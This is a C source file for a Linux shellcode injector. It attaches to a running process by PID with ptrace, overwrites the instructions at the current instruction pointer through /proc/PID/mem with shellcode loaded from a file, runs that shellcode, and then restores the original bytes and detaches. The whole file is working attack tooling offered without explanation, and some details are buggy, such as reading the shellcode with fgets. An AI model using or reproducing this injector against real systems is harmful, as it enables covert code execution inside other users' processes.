#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>


int main(int argc, char **argv)
{
	if (argc < 3)
	{
		printf("Usage: %s <file> <PID>\n", argv[0]);
		exit(-1);
	}
	int pid = strtol(argv[2],0,10);
	char memfile[100];
	uint8_t *mem;
	int fd;
	int memfd;
	int status;
	struct user_regs_struct reg;
	char shellcode[1024];

	printf("[+] Opeaning file %s\n", argv[1]);
	fd = open(argv[1], O_RDWR);

	struct stat buf;
	fstat(fd, &buf);
	printf("[+] Size of shellcode: %d\n", buf.st_size);

	mem = mmap(NULL, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	printf("[+] File mapped at %p\n", mem);

	printf("[+] Attaching process\n");
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
	{
		printf("Attaching process failed\n");
		exit(-1);
	}	

	waitpid(pid, &status, 0);
		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
		printf("[*] Process attached\n");

		printf("[+] Opening /proc/%d/mem\n", pid);
		snprintf(memfile, sizeof(memfile), "/proc/%d/mem", pid);

		memfd = open(memfile, O_RDWR);
		printf("success\n");

		int *backup = (int *)malloc(buf.st_size);
		printf("Backing up previous instructions\n");
		pread(memfd, backup, buf.st_size, reg.rip);

		printf("writing shellcode to memory\n");

		FILE *f = fopen(argv[1], "r");
		fgets(shellcode, 1024, f);

		pwrite(memfd, shellcode, buf.st_size, reg.rip);
		printf("Shellcode successfully injected\n");
		fclose(f);

		reg.rip += 2;
		ptrace(PTRACE_SETREGS, pid, NULL, &reg);

		printf("Resuming application\n");
		pwrite(memfd, "\xcc", 1, reg.rip+buf.st_size-1);

		ptrace(PTRACE_CONT, pid, NULL, 0);

		waitpid(pid, &status, 0);
		printf("Restoring instructions\n");

		pwrite(memfd, backup, buf.st_size, reg.rip-2);
		free(backup);
		ptrace(PTRACE_SETREGS, pid, NULL, &reg);

		printf("[+] Detaching process\n");
		ptrace(PTRACE_DETACH, pid, 0, 0);

		munmap(mem, buf.st_size);
		close(memfd);
		close(fd);

		return 0;

}
